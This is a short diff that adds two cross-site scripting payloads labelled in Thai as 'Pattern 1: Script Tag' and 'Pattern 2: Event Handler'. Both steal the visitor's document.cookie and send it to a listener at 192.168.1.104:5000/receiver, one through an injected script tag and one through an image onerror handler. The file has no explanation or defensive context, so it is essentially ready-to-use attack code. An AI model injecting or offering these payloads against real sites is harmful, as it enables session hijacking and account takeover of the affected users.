@@ -1,0 +1,9 @@
+#รูปแบบที่ 1: การใช้ Script Tag
+<script>
+  var img = new Image();
+  img.src = 'http://192.168.1.104:5000/receiver?data=' + encodeURIComponent(document.cookie);
+</script>
+
+
+#รูปแบบที่ 2: การใช้ Event Handler
+<img src="does-not-exist.jpg" onerror="var img = new Image(); img.src = 'http://192.168.1.104:5000/receiver?data=' + encodeURIComponent(document.cookie);">
